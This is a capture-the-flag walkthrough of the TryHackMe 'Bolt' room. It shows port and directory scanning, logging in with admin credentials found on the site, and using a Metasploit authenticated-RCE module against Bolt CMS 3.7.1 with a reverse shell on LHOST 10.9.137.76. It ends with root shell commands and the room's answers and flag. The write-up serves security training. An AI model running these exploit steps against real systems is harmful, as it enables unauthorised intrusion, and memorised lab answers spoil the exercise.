Bolt Link: https://tryhackme.com/r/room/bolt

Firstly we will start with golden searches because scanning takes a long time.  
nmap -pn -p- -sC -sV (IP) -vvv -oA nmap_full  
![7f8fd8d9db1636cb5773a3c615dca639.png](resources/7f8fd8d9db1636cb5773a3c615dca639.png)  
with nmap scan. Nmap shows us three ports are open, we don’t any information about ssh, let’s focus on http

Basic Directory Scan, gobuster  
**gobuster di**r -u http://IP -w /usr/share/wordlists/dirb/common.txt

Basic Scan, dirb = We will use these results for web server analysis.  
\*\*dirb http://\*\*IP = We will use these results for web server analysis.

Basic Scan netdiscover  
netdiscover = It is used during penetration tests to quickly identify which devices are  
connected to the network.

Access the website, and we get it.

![d86ec8633640c5434960dde97b7c24a0.png](resources/d86ec8633640c5434960dde97b7c24a0.png)

let’s explore this website, in the first article we get interesting information, where we get the username.  
![7a04e64f25934c5b44f4b7347e287e63.png](resources/7a04e64f25934c5b44f4b7347e287e63.png)

The second article shows that we get the password to log in.

![445c5380bdd3d7c1a7cdde7e02182b2c.png](resources/445c5380bdd3d7c1a7cdde7e02182b2c.png)

Username: bolt  
Password: boltadmin123

I tried to search on Google for the Bolt CMS default login page address.

![fe77bbddd071e948a5fda5849ff37d9a.png](resources/fe77bbddd071e948a5fda5849ff37d9a.png)

let’s try to access the login page using the username and password that we got earlier.

<img alt="" class="bh ko mr c jop-noMdConv" width="700" height="357" loading="lazy" role="presentation" src="resources/1_fVUJkSUJOoWHPBvq6fCYgg.png" style="box-sizing: inherit; vertical-align: middle; background-color: #ffffff; width: 680px; max-width: 100%; height: auto;">

yeah, we’re in :) on the web dashboard we get information about the CMS version of this website.

![86a1ac424936a10bb73d37162145929b.png](resources/86a1ac424936a10bb73d37162145929b.png)

> What version of the CMS is installed on the server? (Ex: Name 1.1.1)
> 
> Answer : Bolt 3.7.1
> 
> ![583ad5a03ad1b11fd787dc5a8494aa34.png](resources/583ad5a03ad1b11fd787dc5a8494aa34.png)

![bdcb15c1c273db3e5898fcaf815210c1.png](resources/bdcb15c1c273db3e5898fcaf815210c1.png)

Look for vulnerabilities in this version of the CMS, and it looks like there are vulnerabilities there.  
![adb5a3e4c65f9159c50d9bdcd37448f8.png](resources/adb5a3e4c65f9159c50d9bdcd37448f8.png)

![add65453ed9ee01750314246f56c15f7.png](resources/add65453ed9ee01750314246f56c15f7.png)

![4bab98752da3486ad6bee25ba2fca4d2.png](resources/4bab98752da3486ad6bee25ba2fca4d2.png)

> There’s an exploit for a previous version of this CMS, which allows authenticated RCE. Find it on Exploit DB. What’s its EDB-ID?
> 
> Answer: 48296

&nbsp;

Q: Metaspluoi

Answer: exploit/unix/webapp/bolt_authenticated_rce

&nbsp;

let’s try using msfconsole, and look for a module that matches the vulnerability we’ve been looking for before.

just type search bolt --> this command is going to find all macthing bolt exploits.

![75389091e54cd2c174064bc314079858.png](resources/75389091e54cd2c174064bc314079858.png)

Use the module, and it can be seen that we need a username, password, rhost, and rhost to run this exploit  
![711ae2814373e11b3c88736ad0c21d38.png](resources/711ae2814373e11b3c88736ad0c21d38.png)

Set username, password, rhost, and rhost with existing information.  
![6477ac5377a349d149d24041775f9076.png](resources/6477ac5377a349d149d24041775f9076.png)

![183e74dfa3074990213c88ab2bde2297.png](resources/183e74dfa3074990213c88ab2bde2297.png)

Run the exploit, and boommm. we’re in :)

![d1517757897ff35ed31065d4e1d0f389.png](resources/d1517757897ff35ed31065d4e1d0f389.png)

Try to see the account that we got, and we have got root access :)

Look for the flag in the machine, and we get it.

1.  way

![e388e707a08ef09dbce8edfe78e1cae3.png](resources/e388e707a08ef09dbce8edfe78e1cae3.png)

> Look for flag.txt inside the machine.
> 
> Answer: THM{wh0_d035nt_l0ve5_b0l7_r1gh7?}

second way

![37aaa9ac772c1164ee9d824a48d6452e.png](resources/37aaa9ac772c1164ee9d824a48d6452e.png)

# Conslusion:

msfconsole is a powerful tool for cybersecurity professionals and facilitates tasks such as  
testing attack vectors, finding vulnerabilities, and bypassing security defenses. This tool is used  
by both ethical hackers and malicious actors.  
“msfconsole is a strong tool for cybersecurity experts. It helps test attack methods, find  
security weaknesses, and get around security protections. Both ethical hackers and bad actors  
use this tool.”  
"First I used the 'use' command to select the exploit and then the 'show options' command to  
look for all the options available in the exploit."  
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set RHOSTS bolt  
RHOSTS => bolt  
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LHOST  
10.9.137.76  
LHOST => 10.9.137.76  
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set PASSWORD  
boltadmin123  
PASSWORD => boltadmin123  
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set USERNAME bolt  
USERNAME => bolt  
msf6 exploit(unix/webapp/bolt_authenticated_rce) > set LPORT 3344  
LPORT => 3344  
msf6 exploit(unix/webapp/bolt_authenticated_rce) > exploit  
Whoami  
Root  
find / -name 'flag.txt' 2>/dev/null  
/home/flag.txt  
Cat /home/flag.txt  
THM…..  
Shell , enter!  
\[+\] Reverted user profile back to original state.  
id  
uid=0(root) gid=0(root) groups=0(root)  
Now that we have a root shell, we can read the final flag. I searched for the flag and found that it  
was present in the home directory.  
python3 -c 'import pty;pty.spawn("/bin/bash")'  
root@bolt:~/public/files# find / -name flag.txt 2>/dev/null  
find / -name flag.txt 2>/dev/null  
/home/flag.txt  
root@bolt:~/public/files# cat /home/flag.txt  
cat /home/flag.txt  
THM{\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*}  
root@bolt:~/public/files#  
OR
